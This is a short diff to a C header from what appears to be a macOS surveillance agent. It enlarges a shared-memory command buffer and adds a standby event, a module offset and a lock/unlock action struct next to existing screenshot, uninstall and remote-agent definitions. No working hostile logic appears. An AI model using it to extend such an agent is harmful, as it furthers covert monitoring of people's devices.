@@ -89,7 +89,7 @@ typedef struct kinfo_proc kinfo_proc;
 // Size of the first 2 DWORDs that we need to skip in the configuration file
 #define TIMESTAMP_SIZE sizeof(int) * 2
 
-#define SHMEM_COMMAND_MAX_SIZE  0x3000
+#define SHMEM_COMMAND_MAX_SIZE  0x4040
 // Now is a mult of sizeof(shMemLog) == 10016d
 #define SHMEM_LOG_MAX_SIZE      0x302460
 
@@ -135,6 +135,7 @@ typedef struct kinfo_proc kinfo_proc;
 #define OFFT_SCREENSHOT   0x2040
 #define OFFT_UNINSTALL    0x2440
 #define OFFT_APPLICATION  0x2840
+#define OFFT_STANDBY      0x2C40
 
 extern u_int remoteAgents[];
 
@@ -152,6 +153,7 @@ extern u_int remoteAgents[];
 #define EVENT_LOCATION    0x2009
 #define EVENT_AC          0x200A
 #define EVENT_BATTERY     0x200B
+#define EVENT_STANDBY     0x200C
 
 // NEW - TODO
 //#define EVENT_LOCKSCREEN  (uint)0x000x
@@ -255,6 +257,11 @@ extern u_int remoteAgents[];
 #define LOG_DEVICE          0x0240
 #define LOG_INFO            0x0241
 #define LOG_MAGIC_CALLTYPE  0x26
+
+typedef struct _standByStruct {
+  UInt32 actionOnLock;
+  UInt32 actionOnUnlock;
+} standByStruct;
 
 typedef struct _messagePrefix {
   unsigned size:24;
